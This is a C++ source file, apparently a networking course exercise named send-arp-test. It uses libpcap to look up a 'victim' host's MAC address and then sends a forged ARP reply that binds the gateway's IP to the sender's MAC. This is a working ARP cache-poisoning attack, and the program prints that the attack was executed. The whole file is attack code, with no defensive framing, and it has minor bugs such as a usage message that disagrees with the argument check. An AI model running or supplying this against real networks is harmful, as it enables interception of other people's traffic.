#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

 
void GetMyIpAddr(char *ip_buffer)
{
    int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
     
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);
    
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
     
    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    printf("Got my IP add\n");
    printf("My IP add: %s\n\n", ip_buffer);
}
 


int get_my_mac(uint8_t *my_mac){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1){
        return 0;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
        close(sock);
        return 0;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
            close(sock);
            return 0;
        }
    }

    if (success){
        memcpy(my_mac, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
        printf("Got my MAC add\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
        close(sock);
        return 1;
    }
    else{
        close(sock);
        return 0;
    }
}



void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

EthArpPacket packet;

int send_arp_packet(int method, pcap_t* handle, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip,char* arp_tmac, char* arp_tip){

    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(method == 0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }else if(method == 1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return 0;
    }

    return res;
}

int get_victim_mac(pcap_t* handle, char* my_ip, char* my_mac, char* you_ip, u_char* you_mac){

    while(true){
        send_arp_packet(0, handle, my_mac, "ff:ff:ff:ff:ff:ff", my_mac, my_ip, "00:00:00:00:00:00", you_ip);
        struct pcap_pkthdr* header;
        const u_char* arp_res_packet;
        int res = pcap_next_ex(handle, &header, &arp_res_packet);

        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return 0;
        }
        if(header->caplen < sizeof(EthArpPacket)){
            continue;
        }

        EthArpPacket res_packet;
        EthArpPacket req_packet;

        memcpy(&res_packet, arp_res_packet, (size_t)sizeof(EthArpPacket));
        memcpy(&req_packet, reinterpret_cast<const u_char*>(&packet),(size_t)sizeof(EthArpPacket));

        if((res_packet.arp_.sip_==req_packet.arp_.tip_)&&(res_packet.arp_.tip_==req_packet.arp_.sip_)&&(res_packet.arp_.tmac_==req_packet.arp_.smac_)){
            memcpy(you_mac, res_packet.arp_.smac_, MAC_SIZE);
            printf("Got victim's MAC add\n");
            return 1;
        }
        else continue;
    }
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char* vict_ip;
	char* gate_ip;
	char my_ip[20] = {0,};
    uint8_t my_mac[6] = {0,};
    char my_mac_s[] = "00:00:00:00:00:00";

    u_char vict_mac[6] = {0,};
    char vict_mac_s[] = "00:00:00:00:00:00";
    //char my_mac_s[10];


	char errbuf[PCAP_ERRBUF_SIZE];

    GetMyIpAddr(my_ip);
    get_my_mac(my_mac);

    sprintf(my_mac_s, "%02x:%02x:%02x:%02x:%02x:%02x", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);

    printf("My MAC add: %s\n\n", my_mac_s);

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


    for(int i = 1; i < argc/2 ; i++){
        vict_ip = argv[2*i];
        gate_ip = argv[2*i + 1];

        if(get_victim_mac(handle, my_ip, my_mac_s, vict_ip, vict_mac) != 1){
            fprintf(stderr, "couldn't get sender mac address\n");
        }

        sprintf(vict_mac_s, "%02x:%02x:%02x:%02x:%02x:%02x", vict_mac[0],vict_mac[1],vict_mac[2],vict_mac[3],vict_mac[4],vict_mac[5]);

        printf("Vict MAC add: %s\n\n", vict_mac_s);

        send_arp_packet(1, handle, my_mac_s, vict_mac_s, my_mac_s, gate_ip, vict_mac_s, vict_ip);
        printf("- Arp attacked executed -\n\n");
    }


    pcap_close(handle);
}
